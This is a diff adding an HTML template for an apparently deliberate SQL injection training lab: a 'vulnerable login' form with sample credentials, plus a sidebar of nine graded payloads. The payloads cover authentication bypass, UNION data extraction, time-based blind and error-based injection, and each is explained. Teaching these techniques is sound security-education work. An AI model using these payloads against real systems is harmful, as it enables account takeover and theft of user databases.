@@ -1,0 +1,366 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="login-layout">
+    <!-- Static Login Form Section -->
+    <div class="login-form-section">
+        <h2>🔓 Vulnerable Login</h2>
+        <p class="instruction-text">
+            👉 Use the payloads from the sidebar or test with sample users below
+        </p>
+        
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    <div class="alert alert-{{ 'success' if category == 'success' else 'error' }}">
+                        {{ message }}
+                    </div>
+                {% endfor %}
+            {% endif %}
+        {% endwith %}
+        
+        <form method="POST" class="horizontal-login-form">
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" placeholder="Enter username or payload" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" placeholder="Enter password" required>
+                </div>
+            </div>
+            
+            <div class="form-actions">
+                <button type="submit" class="btn">Login</button>
+            </div>
+        </form>
+        
+        <div class="educational-section">
+            <h4>📚 Sample Users (for testing):</h4>
+            <ul style="text-align: left; color: #e2e8f0;">
+                <li><strong>admin</strong> : admin123</li>
+                <li><strong>user1</strong> : password1</li>
+                <li><strong>john_doe</strong> : secret123</li>
+            </ul>
+        </div>
+        
+        <div style="text-align: center; margin-top: 1.5rem;">
+            <a href="/secure-login" class="btn btn-secondary">Try Secure Login</a>
+        </div>
+    </div>
+    
+    <!-- Dynamic Payloads Sidebar -->
+    <div class="payloads-sidebar">
+        <div class="sidebar-header">
+            🎯 SQL Injection Payloads
+        
+        <div class="difficulty-section">
+            <h5 class="difficulty-title easy">🟢 BEGINNER LEVEL</h5>
+            <p class="difficulty-description">Basic authentication bypass techniques</p>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Classic Comment Attack</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>admin' --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        This attack uses SQL comments to ignore the password check. The single quote closes the username string, and the double dash (--) comments out the rest of the query.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Original Query:</strong> SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'hash'
+                        </div>
+                        <div class="sql-step">
+                            <strong>What happens:</strong> Everything after -- is ignored, so password check is bypassed
+                        </div>
+                        <div class="sql-step">
+                            <strong>Result:</strong> Login succeeds for admin without knowing password
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Allows complete authentication bypass for any known username. Attacker gains full access to user accounts.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Always True Condition</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' OR '1'='1' --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        This payload injects a condition that is always true ('1'='1'), bypassing both username and password validation.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Original Query:</strong> SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'hash'
+                        </div>
+                        <div class="sql-step">
+                            <strong>Logic:</strong> Since '1'='1' is always true, the OR condition makes the entire WHERE clause true
+                        </div>
+                        <div class="sql-step">
+                            <strong>Result:</strong> Returns the first user in the database (usually admin)
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Bypasses all authentication. Often logs in as the first user (admin). Can access any account without credentials.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Boolean Logic Bypass</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>admin' OR 1=1 --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        Similar to the previous attack but targets a specific user (admin) while still using an always-true condition.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Original Query:</strong> SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'hash'
+                        </div>
+                        <div class="sql-step">
+                            <strong>Logic:</strong> Either username='admin' OR 1=1 (which is always true)
+                        </div>
+                        <div class="sql-step">
+                            <strong>Result:</strong> Guaranteed to find a user, typically the admin account
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Specifically targets admin accounts. Grants highest privilege access without authentication.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="difficulty-section">
+            <h5 class="difficulty-title medium">🟡 INTERMEDIATE LEVEL</h5>
+            <p class="difficulty-description">Advanced bypass and data extraction</p>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>UNION-based Information Disclosure</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' UNION SELECT username,password,email,role,created_at FROM users --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        This advanced attack uses UNION to combine the original query with a new one that extracts all user data from the database.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Original Query:</strong> SELECT * FROM users WHERE username = '' UNION SELECT username,password,email,role,created_at FROM users --
+                        </div>
+                        <div class="sql-step">
+                            <strong>UNION Operation:</strong> Combines results from two SELECT statements
+                        </div>
+                        <div class="sql-step">
+                            <strong>Data Exposed:</strong> All usernames, password hashes, emails, roles, and creation dates
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Exposes entire user database including password hashes. Critical data breach affecting all users.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Subquery Attack</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' OR username IN (SELECT username FROM users WHERE role='admin') --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        Uses a subquery to specifically target admin users, demonstrating nested SQL injection techniques.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Subquery:</strong> (SELECT username FROM users WHERE role='admin')
+                        </div>
+                        <div class="sql-step">
+                            <strong>Main Query:</strong> Checks if username is IN the admin list
+                        </div>
+                        <div class="sql-step">
+                            <strong>Result:</strong> Automatically logs in as any admin user
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Targets administrative accounts specifically. Grants highest privilege access to system controls.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Conditional Response Attack</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' OR (SELECT COUNT(*) FROM users)>0 --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        This attack uses conditional logic to test database structure and extract information based on true/false responses.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Condition:</strong> (SELECT COUNT(*) FROM users)>0
+                        </div>
+                        <div class="sql-step">
+                            <strong>Logic:</strong> If users table exists and has records, condition is true
+                        </div>
+                        <div class="sql-step">
+                            <strong>Information Leak:</strong> Confirms table existence and data presence
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Database reconnaissance. Reveals table structure and can be extended to extract specific data through blind techniques.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="difficulty-section">
+            <h5 class="difficulty-title hard">🔴 ADVANCED LEVEL</h5>
+            <p class="difficulty-description">Complex attacks and evasion techniques</p>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Blind SQL Injection (Time-based)</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>10) AND SLEEP(5) --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        This sophisticated attack uses time delays to extract information when the application doesn't show database errors or results.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Condition Test:</strong> LENGTH(password)>10 for admin user
+                        </div>
+                        <div class="sql-step">
+                            <strong>Time Delay:</strong> SLEEP(5) executes only if condition is true
+                        </div>
+                        <div class="sql-step">
+                            <strong>Information Extraction:</strong> Response time reveals if admin password length > 10 characters
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Extracts sensitive information even when application shows no visible errors. Can systematically extract entire database contents.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Error-based Information Extraction</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 1), 0x7e)) --</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        Uses MySQL's EXTRACTVALUE function to force database errors that reveal sensitive information in error messages.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>EXTRACTVALUE Function:</strong> Designed to extract XML data, misused here
+                        </div>
+                        <div class="sql-step">
+                            <strong>CONCAT with 0x7e:</strong> Creates invalid XML path containing username data
+                        </div>
+                        <div class="sql-step">
+                            <strong>Error Message:</strong> Database error reveals the extracted username
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Turns database errors into information disclosure vectors. Can extract any data from any accessible table.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-item">
+                <div class="payload-header">
+                    <h6>Multi-stage UNION Attack</h6>
+                    <span class="payload-toggle">▼</span>
+                </div>
+                <div class="payload-content">
+                    <div class="payload-code">
+                        Username: <code>' UNION SELECT 1,2,3,4,5 WHERE 1=1 AND '1'='1</code><br>
+                        Password: <code>anything</code>
+                    </div>
+                    <div class="payload-explanation">
+                        A sophisticated UNION attack that tests column count and injection points while bypassing simple filters.
+                    </div>
+                    <div class="payload-sql-breakdown">
+                        <h5>SQL Breakdown:</h5>
+                        <div class="sql-step">
+                            <strong>Column Count Test:</strong> UNION SELECT 1,2,3,4,5 tests for 5 columns
+                        </div>
+                        <div class="sql-step">
+                            <strong>Filter Bypass:</strong> Multiple AND conditions to evade simple detection
+                        </div>
+                        <div class="sql-step">
+                            <strong>Data Positioning:</strong> Numbers reveal which positions are displayed to user
+                        </div>
+                    </div>
+                    <div class="payload-risk">
+                        <h5>🚨 Security Risk:</h5>
+                        <p>Foundation for complex data extraction. Identifies injection points for follow-up attacks to steal any database content.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <p><strong>How it works:</strong> The application builds SQL queries by concatenating user input directly into the query string, allowing attackers to inject malicious SQL code and manipulate the database logic.</p>
+        </div>
+    </div>
+</div>
+{% endblock %}
